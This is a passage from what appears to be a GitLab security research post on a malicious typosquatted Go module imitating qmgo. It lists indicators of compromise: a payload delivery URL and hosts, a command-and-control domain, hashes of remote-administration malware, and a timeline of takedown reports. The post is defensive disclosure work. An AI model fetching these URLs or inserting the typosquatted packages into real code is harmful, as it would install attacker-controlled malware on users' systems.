URL\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ehttp://207.148.110.29:80/chainelli.mp3\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003ePayload delivery URL\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eimg.googlex.cloud\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003ePayload delivery host\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003e207.148.110.29\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003ePayload delivery host\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eellipal.spoolsv.cyou\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eCommand \u0026amp; Control host\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003e6ada952c592f286692c59028c5e0fc3fa589759f\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eSHA-1 checksum of chainelli.mp3 remote administration malware\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003e8ae533e2d1d89c871908cbcf5c7d89c433d09b2e7f7d4ade3aef46c55b66509c\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eSHA-256 checksum of chainelli.mp3 remote administration malware\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003e/tmp/vod\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eTemporary download location of chainelli.mp3 remote administration malware\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 id=\"how-gitlab-helps-secure-the-software-supply-chain\" tabindex=\"-1\"\u003eHow GitLab helps secure the software supply chain \u003ca href=\"#how-gitlab-helps-secure-the-software-supply-chain\"\u003e\n          \u003csvg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"\u003e\u003cpath d=\"M12.2426 3.75736C11.4615 2.97631 10.1952 2.97631 9.41416 3.75736L7.99995 5.17157C7.60942 5.56209 6.97626 5.56209 6.58573 5.17157C6.19521 4.78105 6.19521 4.14788 6.58573 3.75736L7.99995 2.34314C9.56205 0.781046 12.0947 0.781046 13.6568 2.34314C15.2189 3.90524 15.2189 6.4379 13.6568 8L12.2426 9.41421C11.8521 9.80473 11.2189 9.80473 10.8284 9.41421C10.4379 9.02369 10.4379 8.39052 10.8284 8L12.2426 6.58578C13.0236 5.80473 13.0236 4.5384 12.2426 3.75736Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003cpath d=\"M10.5355 5.4645C10.926 5.85502 10.926 6.48819 10.5355 6.87871L6.87863 10.5356C6.4881 10.9261 5.85494 10.9261 5.46441 10.5356C5.07389 10.145 5.07389 9.51188 5.46441 9.12135L9.12127 5.4645C9.51179 5.07397 10.145 5.07397 10.5355 5.4645Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003cpath d=\"M3.75742 9.41422C2.97637 10.1953 2.97637 11.4616 3.75742 12.2426C4.53847 13.0237 5.8048 13.0237 6.58584 12.2426L8.00006 10.8284C8.39058 10.4379 9.02375 10.4379 9.41427 10.8284C9.8048 11.219 9.8048 11.8521 9.41427 12.2426L8.00006 13.6569C6.43796 15.219 3.9053 15.219 2.3432 13.6569C0.781107 12.0948 0.781107 9.56211 2.3432 8.00001L3.75742 6.5858C4.14794 6.19527 4.78111 6.19527 5.17163 6.5858C5.56216 6.97632 5.56215 7.60948 5.17163 8.00001L3.75742 9.41422Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003c/svg\u003e\n        \u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003eMalicious dependencies, like the MongoDB Go module attack, highlight why securing the software supply chain requires more than just CVE monitoring. GitLab’s DevSecOps platform includes \u003ca href=\"https://docs.gitlab.com/user/application_security/secure_your_application/\"\u003eApplication Security Testing\u003c/a\u003e scanners like Software Composition Analysis in the development lifecycle, helping teams catch vulnerable or malicious packages before they reach production.\u003c/p\u003e\n\u003cp\u003ePaired with research efforts like this, GitLab aims to enable developers to build applications that are secure from the start without compromising on development velocity.\u003c/p\u003e\n\u003ch2 id=\"timeline\" tabindex=\"-1\"\u003eTimeline \u003ca href=\"#timeline\"\u003e\n          \u003csvg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"\u003e\u003cpath d=\"M12.2426 3.75736C11.4615 2.97631 10.1952 2.97631 9.41416 3.75736L7.99995 5.17157C7.60942 5.56209 6.97626 5.56209 6.58573 5.17157C6.19521 4.78105 6.19521 4.14788 6.58573 3.75736L7.99995 2.34314C9.56205 0.781046 12.0947 0.781046 13.6568 2.34314C15.2189 3.90524 15.2189 6.4379 13.6568 8L12.2426 9.41421C11.8521 9.80473 11.2189 9.80473 10.8284 9.41421C10.4379 9.02369 10.4379 8.39052 10.8284 8L12.2426 6.58578C13.0236 5.80473 13.0236 4.5384 12.2426 3.75736Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003cpath d=\"M10.5355 5.4645C10.926 5.85502 10.926 6.48819 10.5355 6.87871L6.87863 10.5356C6.4881 10.9261 5.85494 10.9261 5.46441 10.5356C5.07389 10.145 5.07389 9.51188 5.46441 9.12135L9.12127 5.4645C9.51179 5.07397 10.145 5.07397 10.5355 5.4645Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003cpath d=\"M3.75742 9.41422C2.97637 10.1953 2.97637 11.4616 3.75742 12.2426C4.53847 13.0237 5.8048 13.0237 6.58584 12.2426L8.00006 10.8284C8.39058 10.4379 9.02375 10.4379 9.41427 10.8284C9.8048 11.219 9.8048 11.8521 9.41427 12.2426L8.00006 13.6569C6.43796 15.219 3.9053 15.219 2.3432 13.6569C0.781107 12.0948 0.781107 9.56211 2.3432 8.00001L3.75742 6.5858C4.14794 6.19527 4.78111 6.19527 5.17163 6.5858C5.56216 6.97632 5.56215 7.60948 5.17163 8.00001L3.75742 9.41422Z\" fill=\"#333333\"\u003e\u003c/path\u003e\u003c/svg\u003e\n        \u003c/a\u003e\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e2025-06-01T09:31:\u003c/strong\u003e GitLab reports \u003ccode\u003egithub.com/qiniiu/qmgo\u003c/code\u003e to Go Security\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e2025-06-01T09:43:\u003c/strong\u003e GitLab reports \u003ccode\u003egithub.com/qiniiu/qmgo\u003c/code\u003e to GitHub\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e2025-06-01T10:14:\u003c/strong\u003e GitLab reports \u003ccode\u003eellipal.spoolsv.cyou\u003c/code\u003e (\u003ccode\u003e188.166.213.194\u003c/code\u003e) to the IP block owner\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e2025-06-02T04:03:\u003c/strong\u003e Go Security takes down \u003ccode\u003egithub.com/qiniiu/qmgo\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e2025-06-02T09:57:\u003c/strong\u003e The IP block owner suspends \u003ccode\u003e188.166.213.194\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e2025-06-03T09:15:\u003c/strong\u003e GitHub suspends \u003ccode\u003egithub.com/qiniiu\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e2025-06-05T17:15:\u003c/strong\u003e GitLab reports \u003ccode\u003egithub.com/qiiniu/qmgo\u003c/code\u003e to Go Security\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e2025-06-05T17:33:\u003c/strong\u003e GitLab reports \u003ccode\u003egithub.com/qiiniu/qmgo\u003c/code\u003e to GitHub\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e2025-06-05T17:45:\u003c/strong\u003e Go Security takes down \u003ccode\u003egithub.com/qiiniu/qmgo\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e2025-06-06T12:25:\u003c/strong\u003e GitHub suspends \u003ccode\u003egithub.com/qiiniu\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\u003c/div\u003e",
  "readingTime": "11 min read",
  "publishedTime": "2025-06-30T00:00:00Z",
  "modifiedTime": null
}
